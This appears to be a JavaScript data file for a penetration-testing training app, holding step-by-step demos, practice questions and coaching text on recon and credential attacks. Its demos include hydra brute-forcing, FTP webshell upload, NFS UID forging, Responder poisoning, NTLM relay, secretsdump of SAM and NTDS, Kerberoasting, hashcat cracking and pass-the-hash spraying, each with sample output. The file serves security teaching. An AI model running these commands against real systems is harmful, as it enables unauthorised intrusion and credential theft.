      {"t":"Brute a weak VNC password","d":"When a password is required, hydra runs a wordlist against the VNC auth; lab boxes reuse weak ones.","demo":[{"run":"hydra -P rockyou.txt vnc://<target>","out":"[5900][vnc] host: <target>   password: password1","sig":"password: password1"}],"note":"A cracked VNC password gets you the same interactive desktop the hard way."}]},
    "recon-smtp": {"lead":"A mail server that honours VRFY, EXPN, or RCPT turns a guessed name list into a verified one.","items":[
      {"t":"Verify users with VRFY","d":"smtp-user-enum sends VRFY for each name; a 250 or 252 means the account exists, 550 means it does not.","demo":[{"run":"smtp-user-enum -M VRFY -U users.txt -t <target>","out":"<target>: admin exists\n<target>: jsmith exists\n<target>: wronguser does not exist","sig":"admin exists"}],"note":"admin and jsmith are confirmed; wronguser is not. That is your spray list, pre-filtered."},
      {"t":"Fall back to RCPT","d":"If VRFY is disabled, RCPT TO during a fake delivery leaks the same yes/no and is harder to turn off.","demo":[{"run":"smtp-user-enum -M RCPT -U users.txt -t <target>","out":"<target>: backup exists","sig":"backup exists"}],"note":"RCPT mode confirmed backup even though VRFY was closed."},
      {"t":"Read the banner by hand","d":"A manual connection shows the software and which verbs it allows, so you know which method will work.","demo":[{"run":"echo \"EHLO x\" | nc -nv <target> 25","out":"220 mail.corp.local ESMTP Postfix\n250-mail.corp.local\n250-PIPELINING\n250-VRFY","sig":"250-VRFY"}],"note":"The banner advertises VRFY, so user verification is on the table."}]},
    "recon-ftp": {"lead":"FTP's first test is free: the anonymous login, which routinely exposes configs, backups, and source.","items":[
      {"t":"Try the anonymous login","d":"Log in as anonymous with any password; a successful login lists the files immediately.","demo":[{"run":"curl ftp://anonymous:anonymous@<target>/","out":"-rw-r--r--  1 0  0  1452 Jan 01 config.bak\ndrwxr-xr-x  2 0  0  4096 Jan 01 backups","sig":"config.bak"}],"note":"Anonymous login worked, and config.bak in the root is exactly the kind of leak you want."},
      {"t":"Download the whole tree","d":"wget's recursive mirror pulls every file so you can grep it offline for secrets.","demo":[{"run":"wget -r ftp://anonymous:anonymous@<target>/","out":"config.bak            saved\nbackups/db_2024.sql   saved","sig":"backups/db_2024.sql"}],"note":"A database dump in backups/ is a credential and data goldmine; grep it for passwords."},
      {"t":"Test for a writable directory","d":"Upload a probe file; a writable web root or startup directory turns FTP into code execution.","demo":[{"run":"curl -T test.txt ftp://anonymous:anonymous@<target>/uploads/","out":"226 Transfer complete.","sig":"226 Transfer complete."}],"note":"A successful upload means writable; if /uploads maps to the web root, drop a webshell there."}]},
    "recon-mail": {"lead":"POP3 and IMAP disclose the software, and with a credential the mailbox itself is an attack surface.","items":[
      {"t":"Read the service banner","d":"nc shows the POP3 or IMAP software and capabilities, which reveal whether password login is available.","demo":[{"run":"nc -nv <target> 110","out":"+OK Dovecot ready.\nCAPA\nUSER\nSASL PLAIN LOGIN","sig":"+OK Dovecot ready."}],"note":"Dovecot on 110 with USER and PLAIN means password login works once you hold a credential."},
      {"t":"Leak the domain via NTLM","d":"The pop3-ntlm-info and imap NSE scripts request NTLM auth and the server leaks the AD domain and hostname.","demo":[{"run":"nmap --script pop3-ntlm-info -p 110 <target>","out":"| pop3-ntlm-info:\n|   Target_Name: CORP\n|   DNS_Computer_Name: mail.corp.local","sig":"DNS_Computer_Name: mail.corp.local"}],"note":"Even unauthenticated, the mail server leaked the domain and the fully-qualified hostname."},
      {"t":"Read the mailbox with a credential","d":"Once you hold a mailbox password, list the messages; people mail each other passwords and reset links.","demo":[{"run":"curl -s \"pop3://<target>/1\" -u jsmith:Spring2024","out":"From: it@corp.local\nSubject: VPN credentials\n\nThe new VPN PSK is in the attached config.","sig":"Subject: VPN credentials"}],"note":"A message titled VPN credentials is exactly the kind of thing mailbox access hands you."}]},
    "rdp-enum": {"lead":"RDP leaks the host and domain name and its NLA mode, and with a credential, validates desktop access.","items":[
      {"t":"Read the NLA and host info","d":"The rdp-ntlm-info script leaks the hostname, domain, and whether Network Level Authentication is required.","demo":[{"run":"nmap --script rdp-ntlm-info -p 3389 <target>","out":"| rdp-ntlm-info:\n|   Target_Name: CORP\n|   NetBIOS_Computer_Name: WS01\n|   Product_Version: 10.0.17763","sig":"NetBIOS_Computer_Name: WS01"}],"note":"The hostname, domain, and Windows build all leak before any login."},
      {"t":"Validate a credential over RDP","d":"nxc rdp with a user and password (or -H a hash) reports whether that account can actually log in.","demo":[{"run":"nxc rdp <target> -u jsmith -p 'Spring2024!'","out":"RDP  <target>  3389  WS01  [+] corp.local\\jsmith:Spring2024! (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! means jsmith can RDP in; an interactive session is one connection away."},
      {"t":"Connect to the desktop","d":"xfreerdp opens the session with the validated credential; drive redirection and dynamic resolution make it usable.","demo":[{"run":"xfreerdp /u:jsmith /p:'Spring2024!' /cert:ignore /v:<target>","out":"[INFO] Loading channel RDPDR\nConnected to <target>:3389","sig":"Connected to <target>:3389"}],"note":"You are on the desktop as jsmith; now hunt locally for privilege escalation."}]},
    "nfs-enum": {"lead":"NFS exports are frequently world-readable or mountable with a forged UID; list, mount, and read.","items":[
      {"t":"List the exports","d":"showmount -e asks which directories the server shares and to whom; a * export is readable by anyone.","demo":[{"run":"showmount -e <target>","out":"Export list for <target>:\n/srv/backups  *\n/home         10.10.10.0/24","sig":"/srv/backups  *"}],"note":"/srv/backups shared with * means any host, yours included, can mount and read it."},
      {"t":"Mount and read","d":"Mount the export locally and browse it; no_root_squash or lax permissions expose files directly.","demo":[{"run":"mount -t nfs <target>:/srv/backups /mnt && ls /mnt","out":"db_dump.sql\nid_rsa\nnotes.txt","sig":"id_rsa"}],"note":"An id_rsa private key sitting in a mounted export is a direct path to SSH access."},
      {"t":"Forge a UID for a locked file","d":"If a file is owned by another UID, create a local user with that UID (or use root under no_root_squash) to read it.","demo":[{"run":"sudo useradd -u 1001 alice && sudo -u alice cat /mnt/notes.txt","out":"svc_sql / DBpass2024!","sig":"DBpass2024!"}],"note":"Matching the owner's UID let you read a file NFS thought was private: a leaked DB credential."}]}
  };
  Object.keys(RECON_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = RECON_HOW[k]; });

  // Bespoke "your turn" practice for the recon moves that lacked it. First choice is the move itself;
  // distractors are plausible neighbours; each coach line teaches the distinction.
  var RECON_PRACTICE = {
    "recon-telnet": {"situation": "A full scan shows just 23/tcp open on an old-looking host, and the banner says BusyBox.", "choices": ["recon-telnet", "online-brute-ssh", "recon-ftp", "nmap-version-scripts"], "coach": {"online-brute-ssh": "There is no SSH here; the cleartext telnet in front of you is the login to test.", "recon-ftp": "No FTP port is open; work the service you actually have.", "nmap-version-scripts": "You already know it is telnet from the banner; now try the device default instead of re-scanning."}},
    "recon-rservices": {"situation": "Ports 512, 513 and 514 are open on an old Solaris box and you have no credentials.", "choices": ["recon-rservices", "online-brute-ssh", "recon-telnet", "password-spray"], "coach": {"online-brute-ssh": "Wrong service and wrong idea; r-services authenticate by trust, so there is no password to brute.", "recon-telnet": "Telnet is not what is open; the r-services are, and they may let you in with no password at all.", "password-spray": "Spraying assumes a password check, and the whole point of r-services is that a trusted host needs none."}},
    "recon-rsync": {"situation": "A scan shows 873/tcp open and nothing else obviously exploitable. What is the first move?", "choices": ["recon-rsync", "online-brute-ftp", "nmap-vuln-scripts", "recon-ftp"], "coach": {"online-brute-ftp": "Different service; rsync modules are usually anonymous, so list them before assuming you must brute anything.", "nmap-vuln-scripts": "A vuln scan will not read the shares; list the rsync modules directly, the data is right there.", "recon-ftp": "No FTP here; rsync is its own file service, list its modules with rsync --list-only."}},
    "recon-tftp": {"situation": "A UDP scan is the only thing that found anything: 69/udp open on what looks like a router. What now?", "choices": ["recon-tftp", "nmap-udp-top", "online-brute-ssh", "recon-snmp"], "coach": {"nmap-udp-top": "That is how you found 69; now actually pull files from it rather than re-scanning.", "online-brute-ssh": "No SSH, and TFTP has no login to brute; fetch the device config files by name instead.", "recon-snmp": "Reasonable in parallel, but the config you can TFTP down often contains the SNMP community string you would otherwise have to guess."}},
    "recon-x11": {"situation": "A scan shows 6000/tcp open and the x11-access script says access is granted. What does that get you?", "choices": ["recon-x11", "recon-vnc", "nmap-vuln-scripts", "online-brute-rdp"], "coach": {"recon-vnc": "Different remote-display service; VNC is 59xx, and here the X server on 6000 is already open with no auth, so just use it.", "nmap-vuln-scripts": "You do not need a vuln scan; access is already granted, so screenshot and key-log the live session now.", "online-brute-rdp": "There is no login to brute here; an open X display needs no password at all."}},
    "ftp-upload-webshell": {"situation": "Anonymous FTP lets you upload files, and the box also serves a website on port 80. What is the highest-value move?", "choices": ["ftp-upload-webshell", "recon-ftp", "web-shells", "online-brute-ftp"], "coach": {"recon-ftp": "That is how you found the writable FTP; the next leap is testing whether its directory is the web root so the upload becomes RCE.", "web-shells": "That is the payload you deliver, but here the delivery is FTP write over the web root, prove that overlap first.", "online-brute-ftp": "You already have anonymous write; no need to brute an account."}},
    "nmap-vuln-scripts": {situation:"Your version scan flagged Windows Server 2008 R2 on 445. What is the next move?", choices:["nmap-vuln-scripts","eternalblue","recon-smb-anon","nmap-version-scripts"], coach:{"eternalblue":"Likely the payoff, but confirm the box is actually vulnerable first: the ms17-010 vuln script tells you before you fire an exploit at it.","recon-smb-anon":"Worth doing in parallel, but an old unpatched build is begging for a specific vuln check, not just a null-session enumeration.","nmap-version-scripts":"Already done, that is what named 2008 R2. Now run the detection scripts against it."}},
    "nmap-udp-top": {situation:"Your full TCP sweep found only 22 and 80, and neither has led anywhere. What now?", choices:["nmap-udp-top","recon-web-triage","nmap-vuln-scripts","nmap-fast-open-ports"], coach:{"recon-web-triage":"Fine to keep working 80, but when the web stalls, the half of the attack surface you have not touched is UDP.","nmap-vuln-scripts":"With only ssh and http there is little for the TCP vuln scripts to find; a UDP pass may surface a whole new service.","nmap-fast-open-ports":"Already done for TCP. The scan you are missing is UDP."}},
    "recon-dns": {situation:"The scan shows 53 open and an LDAP banner named the domain corp.local. What do you try?", choices:["recon-dns","recon-smb-anon","recon-snmp","nmap-vuln-scripts"], coach:{"recon-smb-anon":"A good parallel move if 445 is open, but a nameserver answering for its own domain is begging for a zone transfer first.","recon-snmp":"Only if 161/udp is open; the obvious lead right now is the DNS server you can query.","nmap-vuln-scripts":"Premature. You have a nameserver to mine for the internal host map before chasing CVEs."}},
    "recon-snmp": {situation:"A UDP scan found 161 open. What is the first thing to try?", choices:["recon-snmp","recon-dns","nmap-udp-top","recon-smb-anon"], coach:{"recon-dns":"Only if 53 is open; 161 is SNMP, and the first move there is guessing the community string.","nmap-udp-top":"Already done, that is what found 161. Now actually enumerate it.","recon-smb-anon":"Different service. SNMP is the open UDP lead in front of you."}},
    "recon-ike-vpn": {situation:"UDP 500 came back open|filtered. What confirms and exploits it?", choices:["recon-ike-vpn","nmap-udp-top","recon-snmp","recon-vnc"], coach:{"nmap-udp-top":"That is how you found 500; now fingerprint the IKE service and try aggressive mode.","recon-snmp":"Different UDP service (161). Port 500 is IKE, so reach for ike-scan.","recon-vnc":"Unrelated. VNC is 5900; the open UDP 500 is a VPN handshake endpoint."}},
    "recon-finger": {situation:"Port 79 is open on an old Unix host and you have no usernames yet. What next?", choices:["recon-finger","recon-smtp","online-brute-ssh","recon-smb-anon"], coach:{"recon-smtp":"Also a user oracle, but only if 25 is open; 79 is finger, which confirms accounts directly.","online-brute-ssh":"You need a username list before brute-forcing SSH, and finger is how you build one here.","recon-smb-anon":"Wrong service family. This is an old Unix box with finger open, not SMB."}},
    "recon-vnc": {situation:"The scan shows 5900 open. What is the enumeration question?", choices:["recon-vnc","rdp-enum","recon-smb-anon","nmap-vuln-scripts"], coach:{"rdp-enum":"RDP is 3389, a different remote-desktop service; 5900 is VNC, and the question is whether it even needs a password.","recon-smb-anon":"Different service. VNC on 5900 is the lead here.","nmap-vuln-scripts":"You can, but the first VNC question (auth mode) is answered by one targeted script, not the whole vuln category."}},
    "recon-smtp": {situation:"Port 25 is open and you have a short list of likely usernames. What next?", choices:["recon-smtp","recon-finger","password-spray","recon-mail"], coach:{"recon-finger":"Also a user oracle, but only on 79; 25 is SMTP, which verifies names with VRFY right now.","password-spray":"Spray later. First verify which of your guessed names are real so the spray is not pure noise.","recon-mail":"That is POP3/IMAP for reading mail; 25 is for confirming users, a different job."}},
    "recon-ftp": {situation:"The scan found 21 open. What is the free first test?", choices:["recon-ftp","online-brute-ftp","recon-smb-anon","content-discovery"], coach:{"online-brute-ftp":"Brute-forcing is the paid option; try the free anonymous login first, it works constantly.","recon-smb-anon":"Different service. Port 21 is FTP, and anonymous FTP is the immediate win to check.","content-discovery":"That is for web. FTP's equivalent free win is the anonymous login."}},
    "recon-mail": {situation:"Ports 110 and 143 are open and you just recovered the password for jsmith. What now?", choices:["recon-mail","recon-smtp","password-spray","recon-smb-anon"], coach:{"recon-smtp":"That verifies usernames on 25; here you already hold a credential, so read the mailbox itself.","password-spray":"You could reuse the password elsewhere, but the mailbox in front of you may hold more secrets to read first.","recon-smb-anon":"Different service. The open mail ports plus a credential mean: log in and read the mail."}},
    "rdp-enum": {situation:"3389 is open and you hold valid credentials for jsmith. What do you check?", choices:["rdp-enum","recon-vnc","recon-smb-anon","password-spray"], coach:{"recon-vnc":"VNC is 5900; 3389 is RDP, so validate whether jsmith can actually reach the desktop there.","recon-smb-anon":"Anonymous SMB is a no-credential move; you already hold a credential, so test it against RDP.","password-spray":"You already have a working credential for this user; the question now is what access it grants, starting with RDP."}},
    "nfs-enum": {situation:"The scan shows 2049 and 111 (rpcbind) open. What next?", choices:["nfs-enum","recon-smb-anon","recon-ftp","recon-mail"], coach:{"recon-smb-anon":"That is SMB on 445; NFS on 2049 is a different file-share service, enumerated with showmount.","recon-ftp":"Also file access, but on 21; here 2049 means NFS exports to list and mount.","recon-mail":"Unrelated. The open 2049 is a network filesystem, so ask what it exports."}}
  };
  Object.keys(RECON_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = RECON_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // creds lane lead-ups. Crack moves are reached from the dump or capture that produced the hash;
  // online brute moves from a scan with no credential; poisoning/relay from a LAN foothold.
  // Multi-route only where a genuine second source exists (SAM vs NTDS, Responder vs relay, signing vs coercion).
  var CREDS_LEADUPS = {
    "crack-identify": [
      { key: "dump", label: "A dump produced an unknown hash", steps: [
        { title: "Dump local secrets", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump corp.local/jsmith:'P@ss'@<target>", out: "[*] Dumping local SAM hashes\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: "31d6cfe0d16ae931b73c59d7e0c089c0", teach: "You are holding a hash but do not yet know its type; naming it decides the crack mode." } ] },
    ],
    "crack-kerberoast": [
      { key: "roast", label: "Kerberoasting returned a service ticket", steps: [
        { title: "Request SPN tickets", tool: "GetUserSPNs", where: "local", cmd: "impacket-GetUserSPNs corp.local/jsmith:'P@ss' -request", out: "$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQL/sql01*$a1b2...", sig: "$krb5tgs$23$", teach: "The $krb5tgs$ hash cracks offline to the service account's password, with no lockout risk." } ] },
    ],
    "crack-asrep-offline": [
      { key: "roast", label: "AS-REP roasting returned a hash", steps: [
        { title: "Roast pre-auth-disabled users", tool: "GetNPUsers", where: "local", cmd: "impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass", out: "$krb5asrep$23$tgibson@CORP.LOCAL:f3c8...", sig: "$krb5asrep$23$", teach: "The $krb5asrep$ hash cracks offline to tgibson's plaintext, no credential spent to get it." } ] },
    ],
    "crack-ntlm": [
      { key: "sam", label: "A local SAM dump", steps: [
        { title: "Dump the local SAM", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -sam sam.save -system system.save LOCAL", out: "Administrator:500:aad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::", sig: "2b576acbe6bcfda7294d6bd18041b8fe", teach: "The local Administrator NT hash may crack, or pass, or reveal a password reused on other hosts." } ] },
      { key: "ntds", label: "A domain NTDS dump", steps: [
        { title: "Dump NTDS.dit", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -just-dc corp.local/Administrator@<target>", out: "corp.local\\jsmith:1103:aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::", sig: "64f12cddaa88057e06a81b54e73b949b", teach: "Every domain user's NT hash is in hand; crack the weak ones for plaintext you can reuse." } ] },
    ],
    "crack-netntlmv2": [
      { key: "responder", label: "Responder caught a hash", steps: [
        { title: "Poison and capture", tool: "responder", where: "local", cmd: "sudo responder -I eth0", out: "[SMB] NTLMv2-SSP Hash : jsmith::CORP:1122334455667788:A1B2...", sig: "NTLMv2-SSP Hash", teach: "A NetNTLMv2 capture cannot be passed, so cracking (or relaying) is the only way to use it." } ] },
      { key: "relay", label: "A relay logged a hash it could not use", steps: [
        { title: "Relay saw signing required", tool: "ntlmrelayx", where: "local", cmd: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support", out: "[-] SMB signing is required: relay to SMB not possible", sig: "relay to SMB not possible", teach: "Signing blocked the relay, so crack the NetNTLMv2 hash Responder captured instead." } ] },
    ],
    "crack-shadow": [
      { key: "foothold", label: "You read /etc/shadow as root", steps: [
        { title: "Read the shadow file", tool: "cat", where: "host", cmd: "cat /etc/shadow", out: "root:$6$Xq2$9Zk...:19876:0:99999:7:::", sig: "root:$6$", teach: "$6$ marks a SHA-512 crypt hash; crack it offline (hashcat -m 1800) rather than on the box." } ] },
    ],
    "crack-archive": [
      { key: "loot", label: "A share held a locked archive", steps: [
        { title: "Pull the archive from a share", tool: "smbclient", where: "local", cmd: "smbclient //<target>/backups -N -c 'get backup.zip'", out: "getting file backup.zip (5242880 bytes)", sig: "backup.zip", teach: "A password-protected archive in loot almost always hides the next credential." } ] },
    ],
    "crack-mscache2": [
      { key: "dump", label: "A workstation dump leaked cached logons", steps: [
        { title: "Dump a workstation's secrets", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -security security.save -system system.save LOCAL", out: "[*] Dumping cached domain logon information\nCORP.LOCAL/jsmith:$DCC2$10240#jsmith#a1b2c3...", sig: "$DCC2$", teach: "DCC2 blobs are cached domain logons; slow to crack but a genuine domain password when one falls." } ] },
    ],
    "online-brute-ssh": [
      { key: "scan", label: "The scan found 22 and you have a user list", steps: [
        { title: "Confirm SSH is open", tool: "nmap", where: "local", cmd: "nmap -p 22 <target>", out: "22/tcp open  ssh", sig: "22/tcp open  ssh", teach: "With SSH open and a username in hand, a tight, slow brute is a last-resort way in." } ] },
    ],
    "online-brute-ftp": [
      { key: "scan", label: "Anonymous FTP failed", steps: [
        { title: "Anonymous login was refused", tool: "curl", where: "local", cmd: "curl ftp://anonymous:anonymous@<target>/", out: "curl: (67) Access denied: 530", sig: "530", teach: "Anonymous is closed, so a careful credentialed brute is the fallback for this FTP." } ] },
    ],
    "online-brute-rdp": [
      { key: "scan", label: "The scan found 3389 and no credential works yet", steps: [
        { title: "Confirm RDP is open", tool: "nmap", where: "local", cmd: "nmap -p 3389 <target>", out: "3389/tcp open  ms-wbt-server", sig: "3389/tcp open  ms-wbt-server", teach: "RDP is open but you hold no credential; a slow, lockout-aware spray is the late-stage option." } ] },
    ],
    "responder-poison": [
      { key: "internal", label: "You are on the internal network with no credential", steps: [
        { title: "Confirm your network position", tool: "ip", where: "host", cmd: "ip -4 addr show eth0", out: "inet 10.10.10.50/24 brd 10.10.10.255 scope global eth0", sig: "10.10.10.50/24", teach: "On the LAN with no credential, poisoning broken name resolution harvests hashes passively." } ] },
    ],
    "ntlm-relay-attack": [
      { key: "signing", label: "A host has SMB signing disabled", steps: [
        { title: "Find a relay target", tool: "netexec", where: "local", cmd: "nxc smb 10.10.10.0/24 --gen-relay-list targets.txt", out: "SMB  10.10.10.8  445  FILE01  [+] signing:False", sig: "signing:False", teach: "A host that does not require SMB signing is a valid relay target; now capture auth to send to it." } ] },
      { key: "coerce", label: "You can coerce authentication", steps: [
        { title: "A coercion primitive is available", tool: "coercer", where: "local", cmd: "coercer coerce -t <target> -l <lhost> -u jsmith -p 'P@ss'", out: "[+] FILE01 authenticated to <lhost> (SMB)", sig: "authenticated to <lhost>", teach: "If you can force a host to authenticate to you, relay that authentication instead of waiting for it." } ] },
    ],
    "mitm6-ipv6-takeover": [
      { key: "quiet", label: "Responder stayed quiet on IPv4", steps: [
        { title: "IPv4 name resolution is silent", tool: "responder", where: "local", cmd: "sudo responder -I eth0 -A", out: "[Analyze mode: ON, no poisoning]\n(no LLMNR/NBT-NS queries seen)", sig: "Analyze mode: ON", teach: "When IPv4 name resolution is quiet, the IPv6 stack nobody configured is the opening mitm6 abuses." } ] },
    ]
  };
  Object.keys(CREDS_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = CREDS_LEADUPS[k]; });

  // Field notes for the creds lane, every item a playable demo (correct hashcat modes, real tool output).
  var CREDS_HOW = {
    "crack-identify": {"lead":"Before you crack, name the hash: the format decides the tool, the mode, and whether cracking is even the right move.","items":[
      {"t":"Identify with hashid","d":"hashid matches a hash against known patterns and prints the candidate types with their hashcat modes.","demo":[{"run":"hashid -m '31d6cfe0d16ae931b73c59d7e0c089c0'","out":"Analyzing '31d6cfe0d16ae931b73c59d7e0c089c0'\n[+] NTLM [Hashcat Mode: 1000]\n[+] MD5","sig":"Hashcat Mode: 1000"}],"note":"A bare 32-hex string is almost always NTLM (mode 1000) in a Windows context."},
      {"t":"Recognise the $ prefixes by eye","d":"The prefix is faster than any tool: $krb5tgs$ is Kerberoast (13100), $krb5asrep$ (18200), $6$ sha512crypt (1800), $DCC2$ (2100).","demo":[{"run":"echo '$krb5tgs$23$*svc$CORP$...' | cut -d'$' -f2","out":"krb5tgs","sig":"krb5tgs"}],"note":"krb5tgs means hashcat -m 13100; the prefix alone tells you the mode."},
      {"t":"Count the fields for NetNTLMv2","d":"A NetNTLMv2 hash is user::DOMAIN:challenge:HMAC:blob, six colon-separated fields (five colons); that shape is mode 5600.","demo":[{"run":"awk -F: '{print NF-1\" colons\"}' <<< 'jsmith::CORP:1122:A1B2:0101'","out":"5 colons","sig":"5 colons"}],"note":"The user::DOMAIN: shape is NetNTLMv2 (mode 5600), not a plain NT hash."}]},
    "crack-kerberoast": {"lead":"A $krb5tgs$ hash cracks offline to a service account's password, with no traffic to the DC while you grind.","items":[
      {"t":"Crack with hashcat mode 13100","d":"Point hashcat at the TGS hash with a wordlist; service accounts often carry weak, rarely-rotated passwords.","demo":[{"run":"hashcat -m 13100 tgs.hash rockyou.txt","out":"$krb5tgs$23$*svc_sql$CORP.LOCAL$...:Summer2023!\nStatus: Cracked","sig":":Summer2023!"}],"note":"svc_sql's password is Summer2023!; now a real credential to spray and reuse."},
      {"t":"Add a rules file for near-misses","d":"best64 mutates the wordlist (caps, digits, years), catching policy-padded passwords a raw list misses.","demo":[{"run":"hashcat -m 13100 tgs.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule","out":"Recovered......: 1/1 (100.00%)","sig":"Recovered......: 1/1"}],"note":"Rules turn 'Summer' into 'Summer2023!', which is how most corporate passwords look."},
      {"t":"John the Ripper as the CPU fallback","d":"john with --format=krb5tgs cracks the same hash without a GPU, handy when your box has none.","demo":[{"run":"john --format=krb5tgs --wordlist=rockyou.txt tgs.hash","out":"Summer2023!      (svc_sql)","sig":"(svc_sql)"}],"note":"Same result, CPU-only; john is the fallback when no GPU is available."}]},
    "crack-asrep-offline": {"lead":"An AS-REP hash cracks offline to a pre-auth-disabled user's plaintext, the quietest credential you can get.","items":[
      {"t":"Crack with hashcat mode 18200","d":"The $krb5asrep$ hash is mode 18200; a weak password falls to a wordlist quickly.","demo":[{"run":"hashcat -m 18200 asrep.hash rockyou.txt","out":"$krb5asrep$23$tgibson@CORP.LOCAL:...:Welcome1\nStatus: Cracked","sig":":Welcome1"}],"note":"tgibson's password is Welcome1; a confirmed domain credential with zero auth attempts spent."},
      {"t":"Match the etype to the mode","d":"AS-REP in the wild is almost always etype 23 (RC4), which is hashcat mode 18200. If --identify ever shows a different etype, match the mode before wasting a run.","demo":[{"run":"hashcat --identify asrep.hash","out":"18200 | Kerberos 5, etype 23, AS-REP","sig":"18200"}],"note":"--identify confirms etype 23 maps to 18200 before you waste time on the wrong mode."},
      {"t":"Take it hashcat-ready from GetNPUsers","d":"GetNPUsers writes the hash in hashcat format directly, so there is no reformatting before cracking.","demo":[{"run":"impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash","out":"[*] Saving hashes to asrep.hash","sig":"Saving hashes to asrep.hash"}],"note":"-format hashcat means the file drops straight into hashcat -m 18200."}]},
    "crack-ntlm": {"lead":"An NT hash may crack to plaintext you can reuse where a hash cannot go (RDP, web, SSH).","items":[
      {"t":"Crack with hashcat mode 1000","d":"NT hashes are mode 1000 and unsalted, so they crack extremely fast against a wordlist.","demo":[{"run":"hashcat -m 1000 nt.hash rockyou.txt","out":"2b576acbe6bcfda7294d6bd18041b8fe:P@ssw0rd2024\nStatus: Cracked","sig":":P@ssw0rd2024"}],"note":"The local admin password is P@ssw0rd2024; try it on every other host for reuse."},
      {"t":"Recognise the empty-password hash","d":"31d6cfe0d16ae931b73c59d7e0c089c0 is the NT hash of an empty string: the account has no password, nothing to crack.","demo":[{"run":"grep 31d6cfe0d16ae931b73c59d7e0c089c0 ntds.dump","out":"Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::","sig":"31d6cfe0d16ae931b73c59d7e0c089c0"}],"note":"That constant is the blank-password hash; Guest simply has no password set."},
      {"t":"Try passing it before cracking","d":"Spray the hash across hosts with nxc -H; a (Pwn3d!) means pass-the-hash works and cracking is unnecessary.","demo":[{"run":"nxc smb 10.10.10.0/24 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe","out":"SMB  10.10.10.8  445  FILE01  [+] Administrator (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"If the hash passes, you may not need to crack it; cracking is only for where a hash cannot go."}]},
    "crack-netntlmv2": {"lead":"A NetNTLMv2 capture cannot be passed, so a wordlist is the only way to turn it into a login.","items":[
      {"t":"Crack with hashcat mode 5600","d":"NetNTLMv2 is mode 5600, salted with the server challenge, so slower than NT but still beatable by a weak password.","demo":[{"run":"hashcat -m 5600 netntlm.hash rockyou.txt","out":"JSMITH::CORP:1122334455667788:...:Spring2024!\nStatus: Cracked","sig":":Spring2024!"}],"note":"jsmith's password is Spring2024!; now a real login wherever that account is valid."},
      {"t":"Dedupe Responder's captures first","d":"Responder uses a fresh challenge per capture, so the same user appears many times; keep one line per user before cracking.","demo":[{"run":"sort -u -t: -k1,1 hashes.txt > netntlm.hash && wc -l < netntlm.hash","out":"2","sig":"2"}],"note":"Cracking two unique users, not fifty copies, saves hours of wasted GPU."},
      {"t":"Pull the hash from Responder's logs","d":"Responder writes every capture under /usr/share/responder/logs; the whole line is one hash.","demo":[{"run":"cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.50.txt","out":"jsmith::CORP:1122334455667788:A1B2C3D4...:0101000000...","sig":"jsmith::CORP"}],"note":"The per-host log file is the source of truth; copy the full line as the hash."}]},
    "crack-shadow": {"lead":"A Linux /etc/shadow hash cracks offline to the account password, often reused for sudo or SSH.","items":[
      {"t":"Merge passwd and shadow with unshadow","d":"unshadow pairs each /etc/shadow hash with its username from /etc/passwd into one crackable file.","demo":[{"run":"unshadow passwd.txt shadow.txt > crack.txt","out":"root:$6$Xq2$9Zk...:0:0:root:/root:/bin/bash","sig":"root:$6$"}],"note":"Pairing the hash with its username means a crack tells you whose password it is."},
      {"t":"Crack sha512crypt with mode 1800","d":"$6$ is sha512crypt, hashcat mode 1800; it is slow by design, so a targeted wordlist beats brute force.","demo":[{"run":"hashcat -m 1800 crack.txt rockyou.txt","out":"$6$Xq2$9Zk...:Toor1234\nStatus: Cracked","sig":":Toor1234"}],"note":"root's password is Toor1234; reuse it for su, sudo, or SSH."},
      {"t":"Pick the mode from the prefix","d":"$1$ md5crypt (500), $5$ sha256crypt (7400), $6$ sha512crypt (1800), $y$ yescrypt. The prefix picks the mode.","demo":[{"run":"cut -d: -f2 shadow.txt | cut -c1-3","out":"$6$","sig":"$6$"}],"note":"$6$ means mode 1800; reading the prefix first saves a failed run on the wrong mode."}]},
    "crack-archive": {"lead":"The matching *2john turns a locked archive into a crackable hash; inside is usually the next credential.","items":[
      {"t":"Extract the hash with zip2john","d":"zip2john reads the encrypted archive and prints a john-format hash of its password.","demo":[{"run":"zip2john backup.zip > zip.hash","out":"backup.zip:$pkzip2$1*1*2*0*abc123...*$/pkzip2$","sig":"$pkzip2$"}],"note":"The $pkzip2$ hash (legacy ZipCrypto) cracks with hashcat -m 17200; the archive stays locked until you do. A WinZip-AES $zip2$ hash would be -m 13600 instead."},
      {"t":"Crack it and unpack","d":"Crack the hash, then extract with the recovered password and read what was worth hiding.","demo":[{"run":"john --wordlist=rockyou.txt zip.hash","out":"S3cr3tZip        (backup.zip)","sig":"(backup.zip)"}],"note":"S3cr3tZip unlocks it: unzip -P S3cr3tZip backup.zip reveals the contents."},
      {"t":"Match the extractor to the format","d":"zip2john, rar2john, 7z2john, pdf2john, ssh2john: the wrong extractor produces a garbage hash.","demo":[{"run":"7z2john secret.7z | head -c 20","out":"secret.7z:$7z$2$19$","sig":"$7z$"}],"note":"A .7z needs 7z2john; the $7z$ prefix confirms you used the right one."}]},
